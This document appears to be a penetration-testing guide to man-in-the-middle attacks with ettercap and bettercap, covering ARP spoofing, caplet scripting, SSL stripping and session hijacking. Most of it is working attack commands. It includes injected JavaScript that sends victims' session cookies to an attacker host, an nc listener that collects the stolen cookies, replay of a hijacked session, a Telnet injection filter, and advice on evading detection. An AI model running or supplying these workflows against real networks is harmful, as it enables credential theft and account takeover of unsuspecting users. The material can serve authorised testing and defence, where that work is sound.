# Ettercap and Bettercap MITM Attack Guide

## Introduction

Man-in-the-Middle (MITM) attacks are the cornerstone of network-level security testing. By positioning an attacker between two communicating parties, MITM enables credential interception, traffic modification, session hijacking, and protocol downgrade attacks. This guide compares the two most widely used MITM frameworks on Kali Linux — ettercap and bettercap — and provides practical workflows for ARP spoofing, caplet scripting, HTTPS stripping, and session hijacking.

Ettercap has been the traditional MITM tool for over a decade, offering a plugin architecture and text/GUI modes. Bettercap is the modern successor with a modular design, JavaScript-like caplet scripting, and built-in modules for ARP spoofing, DNS spoofing, DHCP spoofing, credential sniffing, and SSL stripping. For new engagements, bettercap is recommended as the primary tool due to its active development, cleaner API, and more reliable protocol handling.

## ARP Spoofing: Ettercap vs Bettercap

### How ARP Spoofing Works

ARP (Address Resolution Protocol) has no authentication mechanism. When a host needs to communicate with an IP address, it broadcasts an ARP request asking "Who has IP X?" Any host on the segment can respond with "I have IP X, my MAC is Y." ARP spoofing exploits this by sending unsolicited ARP replies claiming the attacker's MAC address is associated with the gateway IP (and vice versa), causing traffic to flow through the attacker.

### Ettercap ARP Spoofing

Ettercap uses a target notation format: `/IP/MAC/PORT` where fields can be left empty for wildcard matching.

```bash
# Text mode — ARP spoof target <-> gateway
ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# GUI mode for interactive analysis
ettercap -G

# Spoof entire subnet (aggressive — generates high ARP traffic)
ettercap -T -q -i eth0 -M arp:remote /// ///
```

Key ettercap options:
- `-T` — text-only mode (no GUI)
- `-q` — quiet mode (less output noise)
- `-M arp:remote` — ARP spoof with remote gateway support (both directions)
- `-i eth0` — specify interface

### Bettercap ARP Spoofing

Bettercap uses an interactive REPL with module-based commands:

```bash
# Start bettercap
bettercap -iface eth0

# Network discovery
net.probe on
net.show

# Target a specific host
set arp.spoof.targets 192.168.1.100
arp.spoof on

# Target multiple hosts
set arp.spoof.targets 192.168.1.100,192.168.1.101

# Spoof all internal hosts (be cautious — high noise)
set arp.spoof.internal true
arp.spoof on
```

### Comparison: When to Use Each

| Feature | Ettercap | Bettercap |
|---------|----------|-----------|
| ARP spoofing | Reliable, proven | Reliable, modern |
| Plugin system | C plugins (complex) | Caplets (simple scripting) |
| SSL stripping | Built-in plugin | Built-in module |
| DNS spoofing | Built-in plugin | Built-in module |
| GUI | Native GTK | Web UI (`bettercap -web`) |
| Scripting | Filter language (.ecf) | Caplets (.cap) + JS |
| Development status | Maintenance only | Active development |
| Credential sniffing | Basic | Advanced (protocol-aware) |

**Recommendation**: Use bettercap for all new engagements. Use ettercap only when bettercap is unavailable or for compatibility with existing scripts.

## Caplet Scripting with Bettercap

Caplets are bettercap's scripting format — text files containing a sequence of bettercap commands executed in order. They enable repeatable, automated MITM workflows.

### Basic Caplet Structure

```
# File: basic-mitm.cap
# Description: Basic ARP spoofing with credential logging

# Discover hosts
net.probe on
sleep 5

# Set targets (must be modified before each run)
set arp.spoof.targets 192.168.1.100

# Start ARP spoofing
arp.spoof on

# Start credential sniffing with log output
set net.sniff.output /tmp/mitm_credentials.log
net.sniff on
```

Execute with: `bettercap -iface eth0 -caplet basic-mitm.cap`

### Advanced Caplet: MITM with DNS Spoofing and Injection

```
# File: advanced-mitm.cap
# Description: Full MITM chain with DNS spoof, credential logging, and JS injection

# Phase 1: Discovery
net.probe on
sleep 3
net.show

# Phase 2: ARP Spoofing
set arp.spoof.targets 192.168.1.100
set arp.spoof.internal false
arp.spoof on

# Phase 3: DNS Spoofing
set dns.spoof.domains intranet.target.local,mail.target.local
set dns.spoof.address 192.168.1.50
dns.spoof on

# Phase 4: Credential Sniffing
set net.sniff.output /tmp/full_mitm.log
net.sniff on

# Phase 5: HTTP Proxy with SSL stripping and JS injection
http.proxy on
set http.proxy.sslstrip true
set http.proxy.injectjs "new Image().src='http://192.168.1.50/log?c='+document.cookie"

# Phase 6: Event logging
events.stream on
set events.stream.output /tmp/mitm_events.log
```

### Conditional Caplet Logic

Caplets support basic conditionals using the `if` command and variable expansion:

```
# Conditional: only spoof if target is found
# Note: bettercap caplets are sequential, but you can use
# the REST API for dynamic behavior

# Use environment variables for parameterization
set arp.spoof.targets $TARGET_IP
set dns.spoof.address $ATTACKER_IP
```

For dynamic behavior, use bettercap's REST API:

```bash
# Start bettercap with API enabled
bettercap -iface eth0 -api-rest-addr 127.0.0.1 -api-rest-port 8083

# Interact via API
curl -s http://127.0.0.1:8083/api/session | jq .
curl -s -X POST http://127.0.0.1:8083/api/session/command -d '{"cmd":"arp.spoof on"}'
```

## HTTPS Stripping

### How SSL Stripping Works

SSL stripping intercepts the HTTP-to-HTTPS redirect that occurs when a user types `http://example.com` and the server responds with a 301 redirect to `https://example.com`. The MITM proxy rewrites the redirect URL to remain `http://`, proxies the connection to the server over HTTPS, and presents the cleartext HTTP version to the client. The browser shows no certificate warning because no fake certificate is presented — the connection is simply downgraded.

### Bettercap SSL Stripping

```bash
bettercap -iface eth0

# Establish MITM position
set arp.spoof.targets 192.168.1.100
arp.spoof on

# Enable HTTP proxy with SSL stripping
http.proxy on
set http.proxy.sslstrip true

# Start sniffing for credentials
net.sniff on
```

### Limitations of SSL Stripping

SSL stripping fails against:
- **HSTS preloaded sites**: Browsers have a hardcoded list of domains that must use HTTPS (google.com, github.com, facebook.com, etc.). These cannot be stripped.
- **HSTS headers from prior visits**: If the browser has cached the Strict-Transport-Security header from a previous visit, it will refuse HTTP connections.
- **HTTPS Everywhere / browser extensions**: Extensions that force HTTPS will prevent stripping.

For sites protected by HSTS, the alternatives are:
1. **Certificate-based MITM**: Generate a CA certificate, install it on the victim's trust store, and use mitmproxy to intercept HTTPS with a dynamically generated certificate. This produces a browser warning unless the CA is trusted.
2. **SSL Kill / Frida hooking**: On mobile devices, hook the SSL verification functions to bypass certificate validation entirely.
3. **Domain fronting / crossover attacks**: Exploit misconfigured CDN or proxy setups.

## Session Hijacking

### Cookie Stealing via MITM

When HTTP traffic is intercepted (either through SSL stripping or on inherently HTTP sites), session cookies can be stolen and replayed:

```bash
# Bettercap: inject cookie exfiltration JavaScript
bettercap -iface eth0
set arp.spoof.targets 192.168.1.100
arp.spoof on
http.proxy on
set http.proxy.injectjs "new Image().src='http://192.168.1.50/steal?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(document.location)"

# Terminal 2: capture exfiltrated cookies
nc -lvp 80 -k | tee /tmp/stolen_cookies.log
```

### Session Replay

Once a session cookie is captured, replay it to hijack the session:

```bash
# Replay stolen session cookie with curl
curl -H "Cookie: session=stolen_session_id_here" http://target-app.local/profile

# Or use mitmproxy to inject the cookie into a browser session
mitmproxy --mode regular -p 8080
# Use mitmproxy's intercept feature to modify requests
```

### TCP Session Hijacking

For non-HTTP protocols, TCP session hijacking requires predicting or observing sequence numbers:

```bash
# Use ettercap's packet filtering for session injection
# Create ettercap filter to inject commands into Telnet sessions
cat > telnet_inject.ecf << 'EOF'
if (ip.proto == TCP && tcp.src == 23 && search(DATA.data, "login:")) {
    msg("Telnet login prompt detected\n");
}
EOF

etterfilter telnet_inject.ecf -o telnet_inject.ef
ettercap -T -q -i eth0 -M arp:remote /target// /gateway// -f telnet_inject.ef
```

## Cleanup and Anti-Detection

### Clean ARP Cache Restoration

```bash
# In bettercap
arp.spoof off
http.proxy off
dns.spoof off

# Kill standalone tools
killall arpspoof ettercap 2>/dev/null

# Restore iptables
iptables -t nat -F
iptables -F

# Disable IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward
```

### Reducing Detection Footprint

- Target specific hosts instead of entire subnets (less ARP traffic).
- Use `set arp.spoof.internal false` to avoid poisoning inter-host traffic.
- Run shorter MITM sessions (capture what you need, then stop).
- Use bettercap's selective DNS spoofing to respond only to specific domains.
- Prefer mitm6 (IPv6) over ARP spoofing when IPv6 monitoring is absent.

## References

- [Bettercap Official Documentation](https://www.bettercap.org/) — Complete reference for modules, caplets, and API
- [Ettercap GitHub Repository](https://github.com/Ettercap/ettercap) — Legacy MITM framework source and documentation
- [Moxie Marlinspike — SSL Stripping Presentation](https://moxie.org/software/sslstrip/) — Original SSL stripping research and tool
- [MITRE ATT&CK T1557 — Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/) — MITM technique taxonomy
- [ARP Spoofing Detection Paper](https://www.researchgate.net/publication/221046398) — Academic research on ARP spoofing detection methods
